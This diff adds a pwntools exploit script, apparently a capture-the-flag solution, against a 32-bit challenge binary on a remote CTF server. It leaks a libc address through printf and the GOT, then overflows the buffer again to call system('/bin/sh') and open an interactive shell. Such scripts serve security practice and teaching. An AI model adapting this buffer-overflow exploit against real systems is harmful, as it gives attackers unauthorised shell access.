@@ -1,0 +1,80 @@
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+
+r = remote("ctf.j0n9hyun.xyz", 3019)
+# r = process("./pwning")
+
+
+
+# libc = ELF("./libc.so.6")
+e = ELF("./pwning")
+
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+
+r.sendline("-1")
+
+pr = 0x080484e1
+main = 0x080485b8
+
+r.recvline()
+
+
+# libc leak and go to func
+payload  = b""
+payload += b"a" * 0x2c
+payload += b"b" * 0x4
+payload += p32(e.plt['printf'])
+payload += p32(pr)
+payload += p32(e.got['printf'])
+payload += p32(main)
+
+
+sleep(1)
+pause()
+r.sendline(payload)
+pause()
+
+sleep(1)
+
+
+print(r.recvline())
+# print(r.recvuntil("How"))
+# libc_base = 0
+libc_base = u32(r.recvuntil("How")[:4]) - 0x49020
+print(hex(libc_base))
+
+sleep(1)
+r.sendline("-1")
+sleep(1)
+
+print(r.recvline())
+sleep(1)
+
+# libc database에서 안 찾아짐?? 
+
+libc_system = libc_base + 0x3a940
+libc_binsh = libc_base + 0x15902b
+
+# call system("/bin/sh")
+payload  = b""
+payload += b"a" * 0x2c
+payload += b"b" * 0x4
+payload += p32(libc_system)
+payload += p32(pr)
+payload += p32(libc_binsh)
+sleep(1)
+
+r.sendline(payload)
+
+
+
+r.interactive()
+
